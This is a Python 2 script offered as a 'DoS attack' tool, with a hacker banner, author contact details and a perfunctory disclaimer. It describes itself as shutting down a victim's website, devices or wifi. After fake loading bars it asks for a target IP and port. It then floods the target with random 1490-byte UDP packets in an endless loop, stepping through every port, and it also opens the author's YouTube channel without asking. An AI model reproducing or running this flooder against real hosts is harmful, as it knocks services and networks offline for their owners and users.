#!/usr/bin/python2

#coding=utf-8

import socket, os, random, time

from datetime import datetime

from time import sleep

#### colours ####

# B='\033[1;94m'

# R='\033[1;91m'

# G='\033[1;92m'

# W='\033[1;97m'

# S='\033[1;96m'

# P='\033[1;95m'

# Y='\033[1;93m'

B='\033[1;94m'

R='\033[1;91m'

G='\033[1;92m'

W='\033[1;97m'

S='\033[1;96m'

P='\033[1;95m'

Y='\033[1;93m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

os.system("clear")

print 

print(" \033[1;91m██████╗  ██████╗ ███████╗ █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗")

print(" \033[1;91m██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝")

print(" \033[1;96m██║  ██║██║   ██║███████╗███████║   ██║      ██║   ███████║██║     █████╔╝ ")

print(" \033[1;96m██║  ██║██║   ██║╚════██║██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ")

print(" \033[1;91m██████╔╝╚██████╔╝███████║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗")

print(" \033[1;91m╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝")

print ("       \033[1;97m********************************************                      ")

print ("      ||\033[1;91mCoded by: [+]Abbakar mr_eo hacker        ||     ")

print ("      ||\033[1;92mFacebook: [+]Abdullahi Abubakar          ||     ")

print ("      ||\033[1;93mblogwebsite[+]arewaanonymous.blogspot.com||             ")

print ("      ||\033[1;94mWhatsapp: [+]+2349138749261              ||           ")

print ("      ||\033[1;95mGithub: https://github.com/Abbakarhacker ||          ")

print ("      ||\033[1;96mI wont be resposible for illegal use     ||  ")

print ("      ||\033[1;97m*****************************************||                                                 ")

print ("                                                                              ")

print (" \033[1;91mThis is a simple but powerful Dos script which shut down your      ")

print (" \033[1;91mvictim website, Device (mobile phone, pc, printer, smart tv) and   ")

print ("  \033[1;91myour victim wifi network.........                                 ")

print ("                                                                              ")

print ("                                                                              ")

print (" \033[1;96m[1] Start Dos attack                                               ")

print (" \033[1;95m[0] Exit                                                           ")

answer = input("\033[1;93mSELECT AN OPTION:")

os.system('xdg-open https://youtube.com/@arewacyberwarriors/')

    

ip = input("\033[1;93mEnter Victim or Target IP Address : ")

port = int(input("\033[1;94mEnter Victim or Target Port, default port is 80, 4444       : "))

os.system("clear")

print ("\033[1;94mLoading attack script███████████████████████████████████████by % ")

time.sleep(4)

print ("\033[1;92m[      ] 0% ")

time.sleep(3.5)

print ("\033[1;96m[██     ] 10%")

time.sleep(3)

print ("\033[1;96m[███      ] 20%")

time.sleep(3)

print ("\033[1;95m[██████      ] 30%")

time.sleep(3)

print ("\033[1;95m[█████████       ] 40%")

time.sleep(3)

print ("\033[1;94m[█████████████       ] 50%")

time.sleep(3)

print ("\033[1;94m[████████████████          ] 60%")

time.sleep(3)     

print ("\033[1;93m[█████████████████████            ] 70%")

time.sleep(3)

print ("\033[1;93m[████████████████████████████             ] 80%")

time.sleep(2)

print ("\033[1;91m[█████████████████████████████████████     ] 90%")

time.sleep(2)

print ("\033[1;91m[███████████████████████████████████████████████] 100%")

time.sleep(2)

print ("\033[1;93mLoading attack script sucessful█████████████████████████████████████████████████████100%")

time.sleep(2)

print ("\033[1;96mLaunching DOS attack[                    ] 0% ")

time.sleep(3)

print ("\033[1;92mLaunching DOS attack██████████████████████████████████████████████████████████████████████████████████████████████████100%")

time.sleep(2)

print ("Starting DOS attack on victim ip address[                    ] 0%")

time.sleep(2)

print ("\033[1;91mStarting DOS attack on victim ip address██████████████████████████████████████████████████████████████████████████████████████████████████100%")

time.sleep(2)

sent = 0

while True:

     white.sendto(bytes, (ip,port))  #sending a lot of UDP flooding to the entered ip address and port

     sent = sent + 1

     port = port + 1

     print ("\033[1;91mSend \033[1;92m%s \033[1;91m Packets to \033[1;92m%s \033[1;91mThrough port \033[1;92m%s "%(sent, ip, port)) #Sending a lot of request to your target

     if port == 65534:

       port = 1

